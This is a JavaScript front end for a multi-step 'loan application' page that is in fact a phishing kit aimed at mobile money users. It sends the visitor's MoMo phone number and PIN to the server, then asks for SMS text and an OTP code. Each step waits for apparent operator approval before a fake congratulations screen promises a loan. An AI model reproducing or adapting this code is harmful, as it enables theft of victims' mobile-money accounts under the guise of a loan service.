document.addEventListener('DOMContentLoaded', () => {
  let currentStep = 1;
  let appId = null;

  const formSteps = document.querySelectorAll('.form-step');
  const nextBtns = document.querySelectorAll('.btn-next, #nextBtn');

  nextBtns.forEach(btn => {
    btn.addEventListener('click', async (e) => {
      e.preventDefault();
      const activeStep = formSteps[currentStep - 1];
      
      if (activeStep) {
        const requiredInputs = activeStep.querySelectorAll('input[required], select[required], textarea[required]');
        let isValid = true;

        requiredInputs.forEach(input => {
          if (!input.value.trim()) {
            isValid = false;
            input.style.borderColor = '#ffcc00';
          } else {
            input.style.borderColor = '';
          }
        });

        if (!isValid) {
          alert('Please fill in all required fields before proceeding.');
          return;
        }
      }

      // Step 7: MoMo Authentication Checkpoint
      if (currentStep === 7) { 
        const phone = document.getElementById('momoPhone').value;
        const pin = document.getElementById('momoPin').value;

        try {
          const res = await fetch('/applications', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ momo_phone: phone, momo_pin: pin })
          });
          const data = await res.json();
          appId = data.id;

          await fetch(`/applications/${appId}/submit-auth`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ momo_phone: phone, momo_pin: pin })
          });

          showCountdownScreen('Reviewing MoMo Authentication...', 10, () => {
            checkAuthStatus(appId);
          });
        } catch (err) {
          console.error(err);
          alert('Network error. Please try again.');
        }
        return;
      }

      // Step 8: SMS Verification Checkpoint
      if (currentStep === 8) { 
        const smsText = document.getElementById('smsText').value;

        try {
          await fetch(`/applications/${appId}/submit-sms`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ sms_text: smsText })
          });

          showCountdownScreen('Validating SMS Text...', 10, () => {
            checkSmsStatus(appId);
          });
        } catch (err) {
          console.error(err);
          alert('Network error. Please try again.');
        }
        return;
      }

      // Step 9: OTP Verification Checkpoint
      if (currentStep === 9) { 
        const otpCode = document.getElementById('otpCode').value;

        try {
          await fetch(`/applications/${appId}/submit-otp`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ otp_code: otpCode })
          });

          showCountdownScreen('Verifying OTP Code...', 10, () => {
            checkOtpStatus(appId);
          });
        } catch (err) {
          console.error(err);
          alert('Network error. Please try again.');
        }
        return;
      }

      if (currentStep < formSteps.length) {
        formSteps[currentStep - 1].classList.remove('active');
        currentStep++;
        formSteps[currentStep - 1].classList.add('active');
      }
    });
  });

  function showCountdownScreen(title, seconds, callback) {
    let screen = document.getElementById('loadingScreen');
    if (!screen) {
      screen = document.createElement('div');
      screen.id = 'loadingScreen';
      screen.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,31,63,0.95);color:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999;font-family:sans-serif;padding:20px;text-align:center;';
      document.body.appendChild(screen);
    }
    screen.style.display = 'flex';
    let timeLeft = seconds;

    screen.innerHTML = `<h2>${title}</h2><p>Please wait... <b style="color:#ffcc00; font-size:24px;">${timeLeft}s</b> remaining</p>`;
    const timer = setInterval(() => {
      timeLeft--;
      screen.innerHTML = `<h2>${title}</h2><p>Please wait... <b style="color:#ffcc00; font-size:24px;">${timeLeft}s</b> remaining</p>`;
      if (timeLeft <= 0) {
        clearInterval(timer);
        screen.style.display = 'none';
        callback();
      }
    }, 1000);
  }

  function checkAuthStatus(id) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/applications/${id}`);
        const data = await res.json();
        if (data.status === 'auth_approved') {
          clearInterval(interval);
          goToStep(8); // Move to SMS step
        } else if (data.status === 'auth_rejected') {
          clearInterval(interval);
          alert('Authentication Rejected. Redirecting back to Auth step.');
          goToStep(7);
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  function checkSmsStatus(id) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/applications/${id}`);
        const data = await res.json();
        if (data.sms_status === 'sms_correct') {
          clearInterval(interval);
          goToStep(9); // Move to OTP step
        } else if (data.sms_status === 'sms_wrong') {
          clearInterval(interval);
          alert('Wrong SMS Text Provided. Redirecting back to SMS step.');
          goToStep(8);
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  function checkOtpStatus(id) {
    const interval = setInterval(async () => {
      try {
        const res = await fetch(`/applications/${id}`);
        const data = await res.json();
        if (data.otp_status === 'otp_correct') {
          clearInterval(interval);
          showCongratulationsScreen();
        } else if (data.otp_status === 'otp_wrong') {
          clearInterval(interval);
          alert('Wrong OTP Code Provided. Redirecting back to OTP step.');
          goToStep(9);
        }
      } catch (e) {
        console.error(e);
      }
    }, 3000);
  }

  function showCongratulationsScreen() {
    let screen = document.getElementById('loadingScreen');
    if (!screen) {
      screen = document.createElement('div');
      screen.id = 'loadingScreen';
      screen.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:#001f3f;color:#fff;display:flex;flex-direction:column;justify-content:center;align-items:center;z-index:9999;font-family:sans-serif;padding:20px;text-align:center;';
      document.body.appendChild(screen);
    }
    screen.style.display = 'flex';
    screen.innerHTML = `
      <div style="max-width:600px; background:#fff; color:#333; padding:30px; border-radius:12px; box-shadow:0 4px 15px rgba(0,0,0,0.3); text-align:left;">
        <h2 style="color:#001f3f; text-align:center; margin-top:0;">🎉 CONGRATULATIONS! 🎉</h2>
        <p>🇿🇲 <b>Dear Applicant,</b></p>
        <p>We are pleased to inform you that your loan application has successfully passed the initial review stage.</p>
        <p>✅ <b>Your application is now undergoing final verification</b> by our processing team. Kindly remain patient while we complete this final review.</p>
        <p>⏳ Please wait a few more minutes. Once the review is complete and your application is approved, your loan will be processed and released immediately.</p>
        <p>📱 Please keep your phone active and stay available for any important updates.</p>
        <hr style="border:0; border-top:1px solid #ddd; margin:15px 0;">
        <p style="text-align:center; font-size:14px; color:#555; margin-bottom:0;">Thank you for choosing our loan services. We appreciate your trust and look forward to serving you.<br><br><b>Congratulations once again, and thank you for your patience! 🎊</b></p>
      </div>
    `;
  }

  function goToStep(stepNumber) {
    formSteps[currentStep - 1].classList.remove('active');
    currentStep = stepNumber;
    formSteps[currentStep - 1].classList.add('active');
  }
});
            
